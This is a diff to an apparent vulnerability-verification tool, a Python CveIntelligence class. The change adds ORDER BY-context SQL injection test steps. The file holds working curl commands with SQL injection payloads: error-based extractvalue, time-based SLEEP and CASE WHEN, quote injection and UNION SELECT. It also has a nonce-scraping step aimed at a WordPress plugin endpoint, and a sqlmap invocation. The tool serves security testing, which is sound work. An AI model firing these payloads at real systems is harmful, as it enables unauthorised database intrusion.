@@ -1448,25 +1448,52 @@ class CveIntelligence:
             )
 
         elif vc == "sqli":
-            step(
-                f"Test {ep} with quote injection: ' OR '1'='1",
-                curl=(f"curl -si '{full_ep}' "
-                      f"-G --data-urlencode \"search=' OR '1'='1\" | head -20"),
-                expected="SQL error message OR unexpected data in response",
-            )
-            step(
-                "Time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
-                curl=(f"curl -si -w '\\ntime_total: %{{time_total}}\\n' '{full_ep}' "
-                      f"-G --data-urlencode \"search=' AND SLEEP(5)--\""),
-                expected="Response time >= 5 seconds confirms MySQL blind injection",
-            )
-            step(
-                "UNION-based if errors visible: ' UNION SELECT NULL,version(),NULL--",
-                curl=(f"curl -si '{full_ep}' "
-                      f"-G --data-urlencode \"search=' UNION SELECT NULL,version(),NULL--\" "
-                      f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
-                expected="MySQL/Postgres version string in response body",
-            )
+            # Detect ORDER BY context: parameter name suggests sorting, not filtering.
+            _sqli_param = (profile.parameters or [""])[0] if profile.parameters else ""
+            _orderby_ctx = any(kw in _sqli_param.lower() for kw in
+                               ("sort", "order", "orderby", "dir", "asc", "desc"))
+            if _orderby_ctx:
+                step(
+                    f"ORDER BY context — inject scalar subquery without quotes or AND/OR",
+                    curl=(f"curl -si -X POST '{full_ep}' "
+                          f"-d 'nonce=<real_nonce>&directory_id=<real_id>"
+                          f"&{_sqli_param}=,(SELECT+extractvalue(1,concat(0x7e,version())))' "
+                          f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
+                    expected="MySQL version string in XPATH error (e.g. ~8.0.32-MySQL)",
+                )
+                step(
+                    "ORDER BY time-based: CASE WHEN conditional (confirms injection, not just SLEEP accepted)",
+                    curl=(f"time curl -si -X POST '{full_ep}' "
+                          f"-d 'nonce=<real_nonce>&directory_id=<real_id>"
+                          f"&{_sqli_param}=,(SELECT+CASE+WHEN+(1=1)+THEN+SLEEP(5)+ELSE+0+END)' "
+                          f"| tail -2"),
+                    expected="Response takes >=5 s (true case) vs <1 s for 1=2 (false case)",
+                )
+                step(
+                    "NOTE — get a real nonce from the page that renders the directory shortcode",
+                    curl=(f"curl -si '{base}/members-page/' | grep -o '\"nonce\":\"[^\"]*\"' | head -1"),
+                    expected="JSON nonce value embedded in page source by UM plugin",
+                )
+            else:
+                step(
+                    f"Test {ep} with quote injection: ' OR '1'='1",
+                    curl=(f"curl -si '{full_ep}' "
+                          f"-G --data-urlencode \"search=' OR '1'='1\" | head -20"),
+                    expected="SQL error message OR unexpected data in response",
+                )
+                step(
+                    "Time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
+                    curl=(f"curl -si -w '\\ntime_total: %{{time_total}}\\n' '{full_ep}' "
+                          f"-G --data-urlencode \"search=' AND SLEEP(5)--\""),
+                    expected="Response time >= 5 seconds confirms MySQL blind injection",
+                )
+                step(
+                    "UNION-based if errors visible: ' UNION SELECT NULL,version(),NULL--",
+                    curl=(f"curl -si '{full_ep}' "
+                          f"-G --data-urlencode \"search=' UNION SELECT NULL,version(),NULL--\" "
+                          f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
+                    expected="MySQL/Postgres version string in response body",
+                )
             step(
                 "sqlmap confirmation (do NOT run on production): sqlmap -u '<url>' --batch --level=2",
                 curl=f"sqlmap -u '{full_ep}?search=1' --batch --level=2 --dbms=mysql",
